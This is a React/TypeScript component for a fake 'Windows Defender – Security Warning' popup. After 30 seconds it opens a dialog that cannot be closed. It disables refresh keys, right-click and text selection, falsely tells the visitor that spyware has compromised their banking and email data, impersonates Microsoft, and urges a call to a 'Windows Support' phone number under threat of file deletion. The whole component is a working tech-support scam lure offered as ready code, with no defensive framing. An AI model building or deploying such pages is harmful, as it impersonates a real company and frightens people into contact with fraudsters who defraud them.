
import { useEffect, useState } from "react";
import { AlertDialog, AlertDialogContent } from "@/components/ui/alert-dialog";
import { Shield, ShieldAlert, X } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Sheet, SheetContent } from "@/components/ui/sheet";

const BlockingPopup = () => {
  const [open, setOpen] = useState(false);
  const [showDetails, setShowDetails] = useState(false);
  
  useEffect(() => {
    // Show popup after 30 seconds
    const timer = setTimeout(() => {
      setOpen(true);
    }, 30000);

    // Prevent refresh and other browser actions
    const preventDefaultAction = (e: KeyboardEvent) => {
      // Prevent F5 and Ctrl+R/Cmd+R
      if (
        e.key === "F5" || 
        ((e.ctrlKey || e.metaKey) && e.key === "r") ||
        e.keyCode === 116
      ) {
        e.preventDefault();
        return false;
      }
    };

    const preventContextMenu = (e: MouseEvent) => {
      e.preventDefault();
    };

    const preventSelection = (e: Event) => {
      e.preventDefault();
    };

    // Block actions when popup is open
    if (open) {
      // Prevent keyboard shortcuts for refresh
      window.addEventListener("keydown", preventDefaultAction, { capture: true });
      // Prevent right-click
      window.addEventListener("contextmenu", preventContextMenu);
      // Prevent selection
      document.addEventListener("selectstart", preventSelection);
    }

    return () => {
      clearTimeout(timer);
      window.removeEventListener("keydown", preventDefaultAction);
      window.removeEventListener("contextmenu", preventContextMenu);
      document.removeEventListener("selectstart", preventSelection);
    };
  }, [open]);
  
  return (
    <>
      {/* Main security warning dialog */}
      <AlertDialog open={open} onOpenChange={() => {}}>
        <AlertDialogContent 
          className="p-0 border-0 max-w-xl"
          onPointerDownOutside={(e) => e.preventDefault()}
        >
          {/* Blue header */}
          <div className="bg-[#0066cc] text-white p-4">
            <h2 className="text-xl font-bold mb-1">Windows Defender - Security Warning</h2>
            <p className="text-sm font-bold">** ACCESS TO THIS PC HAS BEEN BLOCKED FOR SECURITY REASONS **</p>
          </div>
          
          <div className="p-5 pb-2">
            <div className="flex items-center gap-3 mb-4">
              <img 
                src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0OCA0OCI+PHBhdGggZmlsbD0iIzAwNzhkNCIgZD0iTTI0IDRDMTIuOTU0IDQgNCA1Ljc4MSA0IDUuNzgxdjE5LjAgNS4wYzAgMS42NTcgMC45MDggMy4xODcgMi40MjIgNGwxNS4wIDguMTI1YzEuNjU0IDAuODk1IDMuNjQ4IDAuODc2IDUuMjg3IC0wLjAyNzQ0YzAuMDA5MDMgLTAuMDA1MDcgMC4wMTc5NyAtMC4wMTAzIDAuMDI3MzQgLTAuMDE1NjJsMTIuODQgLTcuMjI0NmMxLjUyNCAtMC44NTYxIDIuNDI0IC0yLjQ0NiAyLjQyNCAtNC4xNzE5di01LjAgLTE4Ljg5NGMtMCAwaC0xOC4weiBtMCAyLjIxODhjOC45OSAwIDE1Ljc4MSAxLjc4MTMgMTUuNzgxIDEuNzgxM3YxNy44NDRjLTAgMCAtNS42NzQgMS42MDYxIC0xNS43ODEgMS42MDYxcy0xNS43ODEgLTEuNjA2IC0xNS43ODEgLTEuNjA2di0xNy44NDRzNi43MzcgLTEuNzgxMyAxNS43ODEgLTEuNzgxM3ptLTQuMjE4OCA3LjIxODhjLTAuNzU4NSAwLjAxIC0xLjQ2MyAwLjQyMSAtMS44NDM4IDEuMDkzOGwtNi43NSAxMi4wYy0wLjI2NTUgMC40NjIgLTAuMjcwNiAxLjAyOSAtMC4wMTM3MSAxLjQ5NjFjMC4yNTY5IDAuNDY3IDAuNzQ0NSAwLjc1NyAxLjI3NzQgMC43NjE3aDkuMEMxNi4zMTQgMjguOTc2IDE2LjI2IDI4LjM3MSAxNi40MDYgMjcuODA1bDEuNDk5OSAtNS45OTk5YzAuMTExOSAtMC40NDkgMC4yMjQxIC0xLjMxMiAwLjIyNDEgLTEuNjI1YzAgLTEuMTc2IC0wLjczODUgLTIuMDkwIC0xLjgxMjUgLTIuNjI1IC0wLjE4MjQgLTAuMDkyIC0wLjM4MTcgLTAuMTM2IC0wLjU4MjEgLTAuMTI1aC0wLjE4OTVjLTAuMDQ0MyAtMC4wMDIgLTAuMDg4NyAtMC4wMDMgLTAuMTMzIDAuMDA3OEwxMC41OTM4IDE4LjI1Yy0wLjMxMDggMC4wNzEgLTAuNTcwNiAwLjI4NCAtMC43MDEyIDAuNTc0MmMtMC4xMzA3IDAuMjkgLTAuMTAzIDAuNjI3IDAuMDc0MiAwLjg5MjZsMy4wNjI0IDQuNjg3NGMwLjI1NzEgMC4zOTQgMC42OTE5IDAuNjI4IDEuMTU3IDAuNjI2aDguMDYyNWwtMS43MTg3IDYuODc1Yy0wLjEyOTYgMC41MjIgMC4wMjk0IDEuMDcxIDAuNDE5OSAxLjQ0NTNjMC4zOTA1IDAuMzc0IDAuOTQ0NCAwLjUxIDEuNDU1MSAwLjM1OTRsMy4wOTM4IC0wLjkwNjNjMC4yNDk1IC0wLjA3NCAwLjQ2NTUgLTAuMjMzIDAuNjA5NCAtMC40NTNsMTEuMTg4IC0xNy4wMDFjMC4xNzI2IC0wLjI2MyAwLjIxNDMgLTAuNTkxIDAuMTEzMyAtMC44OTA2Yy0wLjEwMSAtMC4yOTkgLTAuMzQwOSAtMC41MzEgLTAuNjQyNiAtMC42MjVsLTMuMzc1IC0xLjEyNDljLTAuMzgyIC0wLjEyOCAtMC44MDI3IC0wLjAzNiAtMS4wOTM4IDAuMjM4MmwtNi4xMjUgNS42ODc1bC04Ljc1IC00LjkzNzVjLTAuMjQ4IC0wLjE0IC0wLjUzIC0wLjIwOSAtMC44MTMgLTAuMTk5em0tMC41MzEyIDZoMS41YzAuODQ0MSAwIDEuNjI1IDAuMDkzOCAxLjYyNSAwLjA5MzhzMC4yNDk5IDEuMDMxMiAwLjI0OTkgMi4wMzEyYzAgMC4xOTYgLTAuMDA1IDAuMzkyIC0wLjAxMTcgMC41NjI1aC04LjE3NThjLTAuMDI3NiAwLjAgMCAtMC4wOTM4IDAgLTAuMDkzOGwzLjU2MjUgLTIuNWMwLjI4MTEgLTAuMDQ2IDAuODU3MiAtMC4wOTM4IDEuMjUgLTAuMDkzOHoiLz48L3N2Zz4=" 
                alt="Microsoft Logo" 
                className="w-6 h-6" 
              />
              <span className="font-bold">Microsoft</span>
            </div>
            
            <p className="mb-4">
              Your computer has alerted us that it has been infected with a DOSAttack Spyware. The following data has been compromised:
            </p>
            
            <ul className="list-disc pl-8 mb-4 text-gray-800">
              <li>Email Credentials</li>
              <li>Banking Information</li>
              <li>Personal Photos</li>
            </ul>
            
            <div className="flex justify-end mt-6 mb-4">
              <Button 
                variant="outline"
                className="mr-2"
                onClick={() => setShowDetails(true)}
              >
                More Details
              </Button>
              <Button 
                className="bg-[#0066cc] hover:bg-[#0052a3]"
                onClick={() => {/* Cannot close dialog */}}
              >
                Activate License
              </Button>
            </div>
          </div>
        </AlertDialogContent>
      </AlertDialog>

      {/* Details sheet */}
      <Sheet open={showDetails && open} onOpenChange={() => setShowDetails(false)}>
        <SheetContent className="w-full sm:max-w-md" onPointerDownOutside={(e) => e.preventDefault()}>
          <div className="flex items-center space-x-2 mb-4 text-blue-800">
            <Shield className="h-6 w-6" />
            <h2 className="text-lg font-semibold">Windows Defender Security Center</h2>
            <button 
              className="ml-auto text-gray-500 hover:text-gray-700"
              onClick={() => setShowDetails(false)}
            >
              <X className="h-5 w-5" />
            </button>
          </div>

          <div className="text-center mb-5 text-red-600">
            <p className="font-semibold">App: Ads.fancetracks(2).dll</p>
            <p className="font-semibold">Threat Detected: DOSAttack Spyware</p>
          </div>

          <div className="grid grid-cols-3 gap-2 max-w-sm mx-auto mb-6">
            <div className="border rounded-md p-2 flex flex-col items-center">
              <div className="w-10 h-10 bg-gray-200 rounded-full flex items-center justify-center mb-1">
                <Shield className="h-5 w-5 text-gray-600" />
              </div>
              <span className="text-xs">Scan</span>
            </div>
            <div className="border rounded-md p-2 flex flex-col items-center">
              <div className="w-10 h-10 bg-gray-200 rounded-full flex items-center justify-center mb-1">
                <ShieldAlert className="h-5 w-5 text-gray-600" />
              </div>
              <span className="text-xs">Security</span>
            </div>
            <div className="border rounded-md p-2 flex flex-col items-center">
              <div className="w-10 h-10 bg-gray-200 rounded-full flex items-center justify-center mb-1">
                <Shield className="h-5 w-5 text-gray-600" />
              </div>
              <span className="text-xs">Settings</span>
            </div>
          </div>

          <div className="text-center mb-6">
            <h3 className="text-lg font-bold text-blue-800 mb-2">
              Access to this PC has been blocked for security reasons.
            </h3>
            <p className="text-blue-700 font-semibold">
              Contact Windows Support: 1-865-484-6972 (Toll Free)
            </p>
          </div>

          <p className="text-sm text-gray-600 mb-6">
            Note: If you think this notification is by error, report immediately to Windows Support to halt the auto-deletion of files and applications from this computer. As this computer ID is flagged and is connected over the Internet Servers, files and apps deletion may start any moment.
          </p>

          <div className="flex justify-center gap-4">
            <Button 
              variant="outline" 
              className="w-24 border-gray-300" 
              onClick={() => {/* Cannot close dialog */}}
            >
              Deny
            </Button>
            <Button 
              className="w-24 bg-blue-600 hover:bg-blue-700"
              onClick={() => {/* Cannot close dialog */}}
            >
              Allow
            </Button>
          </div>
        </SheetContent>
      </Sheet>
    </>
  );
};

export default BlockingPopup;
